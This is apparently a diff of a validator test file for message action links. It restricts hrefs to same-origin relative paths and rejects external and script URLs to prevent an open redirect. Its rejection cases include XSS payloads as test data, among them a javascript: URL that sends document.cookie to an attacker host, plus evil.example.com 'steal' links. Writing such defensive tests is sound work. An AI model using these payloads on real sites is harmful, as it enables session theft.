@@ -367,10 +367,12 @@ describe('messages validators', () => {
 
     it.each([
       '/backend/sales/orders/1',
-      'https://example.com/orders/1',
-      'mailto:support@example.com',
-      'tel:+123456789',
-    ])('accepts safe href %s', (href) => {
+      './relative/path',
+      '../parent/path',
+      '/backend/messages/{sourceEntityId}',
+      '?query=1',
+      '#hash',
+    ])('accepts same-origin relative href %s', (href) => {
       const result = messageActionSchema.safeParse({ ...baseAction, href })
       expect(result.success).toBe(true)
     })
@@ -381,13 +383,22 @@ describe('messages validators', () => {
     })
 
     it.each([
+      'https://example.com/orders/1',
+      'http://example.com/orders/1',
+      'HTTPS://example.com/orders/1',
+      'mailto:support@example.com',
+      'tel:+123456789',
+      '  https://example.com/orders/1  ',
       'javascript:fetch(`//attacker/?c=`+document.cookie)',
       'JavaScript:alert(1)',
       '  javascript:alert(1)',
       'data:text/html,<script>alert(1)</script>',
       'vbscript:msgbox(1)',
       '//evil.example.com/steal',
-    ])('rejects unsafe href %s', (href) => {
+    ])('rejects external or unsafe href %s', (href) => {
+      // #3487: an action href must stay same-origin — an absolute or
+      // protocol-relative target would turn the action button into an open
+      // redirect to an attacker-controlled site.
       const result = messageActionSchema.safeParse({ ...baseAction, href })
       expect(result.success).toBe(false)
     })
@@ -404,6 +415,34 @@ describe('messages validators', () => {
       })
 
       expect(result.success).toBe(false)
+    })
+
+    it('rejects a composed message carrying an external https action href (#3487)', () => {
+      const result = composeMessageSchema.safeParse({
+        subject: 'Subject',
+        body: 'Body',
+        visibility: 'internal',
+        recipients: [{ userId: '11111111-1111-1111-8111-111111111111', type: 'to' }],
+        actionData: {
+          actions: [{ id: 'go', label: 'Acknowledge', href: 'https://evil.example.com/steal', isTerminal: true }],
+        },
+      })
+
+      expect(result.success).toBe(false)
+    })
+
+    it('accepts a composed message carrying a same-origin relative action href', () => {
+      const result = composeMessageSchema.safeParse({
+        subject: 'Subject',
+        body: 'Body',
+        visibility: 'internal',
+        recipients: [{ userId: '11111111-1111-1111-8111-111111111111', type: 'to' }],
+        actionData: {
+          actions: [{ id: 'open', label: 'Open', href: '/backend/sales/orders/{sourceEntityId}', isTerminal: true }],
+        },
+      })
+
+      expect(result.success).toBe(true)
     })
   })
 })
